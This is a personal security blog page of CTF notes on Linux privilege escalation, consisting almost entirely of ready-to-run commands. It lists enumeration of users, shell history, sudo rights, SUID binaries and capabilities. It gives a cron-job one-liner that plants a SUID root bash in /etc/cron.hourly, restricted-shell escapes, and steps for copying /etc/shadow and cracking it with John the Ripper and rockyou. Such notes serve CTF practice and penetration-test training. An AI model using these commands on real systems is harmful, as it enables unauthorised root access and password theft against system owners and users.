<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>linux - pwn3rx0</title>
  <meta name="description" content="Check Users & History bash cat /etc/passwd last history cat ~/">
  <meta name="keywords" content="cybersecurity, security, writeups, ctf, pentest, penetration testing, red team, red teaming, malware, malware development, windows internals, windows api, shellcode, payload, injection, active directory, ad, ad enumeration, kerberoasting, lateral movement, post exploitation, defense evasion, opsec, privilege escalation, blue team, incident response, andrew mamdouh, pwn3rx0, andrew_mamdouh, ctf notes, network, priv esc">
  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
  <link rel="canonical" href="/writeups/ctf notes/network/Priv esc/linux.html">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta property="og:title" content="linux">
  <meta property="og:description" content="Check Users & History bash cat /etc/passwd last history cat ~/">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="pwn3rx0 blog">
  <meta property="og:image" content="/assets/images/og-home.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="/writeups/ctf notes/network/Priv esc/linux.html">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="linux">
  <meta name="twitter:description" content="Check Users & History bash cat /etc/passwd last history cat ~/">
  <meta name="twitter:image" content="/assets/images/og-home.png">
  <meta name="site-base" content="/">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
  <link rel="icon" href="/assets/icons/favicon.svg" type="image/svg+xml">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon" sizes="any">
</head>
<body>
  <div class="app-container">
    <aside class="sidebar">
      <div class="profile-card">
        <div class="avatar">
          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
        </div>
        <div class="profile-name">Andrew Mamdouh</div>
        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
        <nav class="social-tabs">
          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122">LinkedIn</a>
          <a class="chip" href="https://x.com/pwn3rx0">X</a>
        </nav>
      </div>
      <nav class="category-tree"></nav>
    </aside>
    <main class="main-content">
      <nav class="breadcrumbs">
      
      <a href="/">Home</a>
    
      <span class="separator">/</span>
      <a href="/category/ctf notes.html">Ctf Notes</a>
    
      <span class="separator">/</span>
      <a href="/category/ctf notes/network.html">Network</a>
    
      <span class="separator">/</span>
      <a href="/category/ctf notes/network/Priv esc.html">Priv Esc</a>
    
      <span class="separator">/</span>
      <span class="current">linux</span>
    </nav>
      <article class="writeup">
        <header>
          <h1>linux</h1>
          <div class="writeup-meta">
            <div class="writeup-date">date: <time datetime="February 23, 2026">February 23, 2026</time></div>
            <div class="tags-row">
              <div class="tags-label">tags:</div>
              <div class="tags"></div>
            </div>
            
          </div>
        </header>
        <div class="writeup-content"><h4>Check Users &amp; History</h4>
<pre><code class="language-bash">cat /etc/passwd
last
history
cat ~/.bash_history
</code></pre>
<h4>Sudo Privileges</h4>
<pre><code class="language-bash">sudo -l
</code></pre>
<h6>If you see something like ALL → instant root: <code>sudo su -</code></h6>
<h4>SUID Binaries</h4>
<pre><code>find / -perm -4000 -type f 2&gt;/dev/null
</code></pre>
<p>Check output in <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<h4>Cron Jobs</h4>
<pre><code class="language-bash">cat /etc/crontab
ls -la /etc/cron*
</code></pre>
<p>u can exploit it by</p>
<pre><code class="language-bash">echo &#39;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&#39; &gt;&gt; /etc/cron.hourly/backup.sh

/tmp/rootbash -p
</code></pre>
<h4>Kernel &amp; Exploits</h4>
<pre><code class="language-bash">uname -a
cat /proc/version
</code></pre>
<h4>Capabilities</h4>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
</code></pre>
<p>like: /usr/bin/python2.7 = cap_setuid+ep → root via Python use  <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<h4>Escaping Restricted Shells</h4>
<pre><code class="language-bash">python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
/bin/sh -i
</code></pre>
<h4>crack shadow</h4>
<pre><code class="language-bash">sudo cat /etc/shadow &gt; shadow_copy.txt
unshadow /etc/passwd shadow_copy.txt &gt; unshadowed.txt
</code></pre>
<p>then</p>
<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
or with rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules unshadowed.txt
or pure bruteforce
john --incremental unshadowed.txt
</code></pre>
</div>
        <nav class="post-navigation">
          <span class="nav-link disabled"><span class="nav-direction">← Previous</span><span class="nav-title">No older post</span></span>
          
      <a href="/writeups/ctf notes/network/Priv esc/upgrade shell.html" class="nav-link next-post">
        <span class="nav-direction">Next →</span>
        <span class="nav-title">upgrade shell</span>
      </a>
    
        </nav>
        
      </article>
    </main>
  </div>
  <button class="mobile-menu-toggle">☰</button>
  <script src="/assets/js/main.js"></script>
  <script src="/assets/js/navigation.js"></script>
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        displayMath: [['$$','$$'], ['\\[','\\]']]
      },
      svg: { fontCache: 'global' }
    };
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
  <script>
    (function() {
      function enhanceCodeBlocks(scope) {
        const container = scope || document.querySelector('.writeup-content') || document;
        const blocks = Array.from(container.querySelectorAll('pre > code')).filter(c => !c.closest('.code-block'));
        blocks.forEach(code => {
          const pre = code.parentElement;
          if (!pre || pre.dataset.enhanced === 'true') return;
          pre.dataset.enhanced = 'true';
          let langClass = Array.from(code.classList || []).find(c => c.startsWith('language-'));
          if (!langClass) {
            const t = code.textContent || '';
            if (/#include\s+<[^>]+>/.test(t) || /\bint\s+main\s*\(/.test(t) || /#include\s+<Windows\.h>/i.test(t)) {
              code.classList.add('language-c');
              langClass = 'language-c';
            }
          }
          const lang = (langClass ? langClass.replace('language-', '') : 'text').toUpperCase();
          const wrapper = document.createElement('div');
          wrapper.className = 'code-block';
          const header = document.createElement('div');
          header.className = 'code-header';
          const langEl = document.createElement('span');
          langEl.className = 'code-lang';
          langEl.textContent = lang;
          const btn = document.createElement('button');
          btn.className = 'code-copy';
          btn.type = 'button';
          btn.textContent = 'Copy';
          btn.addEventListener('click', async () => {
            const text = code.innerText;
            const fallbackCopy = () => {
              const ta = document.createElement('textarea');
              ta.value = text;
              ta.style.position = 'fixed';
              ta.style.opacity = '0';
              ta.style.left = '-9999px';
              document.body.appendChild(ta);
              ta.focus();
              ta.select();
              try {
                document.execCommand('copy');
                btn.textContent = 'Copied';
              } catch (_) {
                btn.textContent = 'Failed';
              } finally {
                document.body.removeChild(ta);
                setTimeout(() => (btn.textContent = 'Copy'), 1200);
              }
            };
            try {
              if (navigator.clipboard && window.isSecureContext) {
                await navigator.clipboard.writeText(text);
                btn.textContent = 'Copied';
                setTimeout(() => (btn.textContent = 'Copy'), 1200);
              } else {
                fallbackCopy();
              }
            } catch (_) {
              fallbackCopy();
            }
          });
          header.appendChild(langEl);
          header.appendChild(btn);
          const holder = document.createElement('div');
          holder.className = 'code-content';
          pre.replaceWith(wrapper);
          holder.appendChild(pre);
          wrapper.appendChild(header);
          wrapper.appendChild(holder);
          if (window.hljs && typeof window.hljs.highlightElement === 'function') {
            window.hljs.highlightElement(code);
          } else if (window.hljs && typeof window.hljs.highlightAll === 'function') {
            window.hljs.highlightAll();
          }
        });
      }
      function indentAfterHeadings(scope) {
        const container = scope || document.querySelector('.writeup-content');
        if (!container) return;
        const headings = container.querySelectorAll('h1,h2,h3,h4,h5,h6');
        headings.forEach(h => {
          const level = parseInt(h.tagName.substring(1), 10);
          let el = h.nextElementSibling;
          while (el) {
            if (/^H[1-6]$/.test(el.tagName)) {
              const nextLevel = parseInt(el.tagName.substring(1), 10);
              if (nextLevel <= level) break;
            }
            if (el.tagName === 'P') {
              el.classList.add('indent-p');
            }
            el = el.nextElementSibling;
          }
        });
      }
      function initEnhancements() {
        if (window.mermaid) {
          mermaid.initialize({ startOnLoad: true, theme: 'dark' });
        }
        enhanceCodeBlocks();
        indentAfterHeadings();
        if (window.hljs && typeof window.hljs.highlightAll === 'function') {
          window.hljs.highlightAll();
        }
        const target = document.querySelector('.writeup-content');
        if (target && window.MutationObserver) {
          const mo = new MutationObserver(() => {
            enhanceCodeBlocks(target);
            indentAfterHeadings(target);
            if (window.hljs && typeof window.hljs.highlightAll === 'function') {
              window.hljs.highlightAll();
            }
          });
          mo.observe(target, { childList: true, subtree: true });
        }
      }
      window.addEventListener('load', initEnhancements);
    })();
  </script>
</body>
</html>
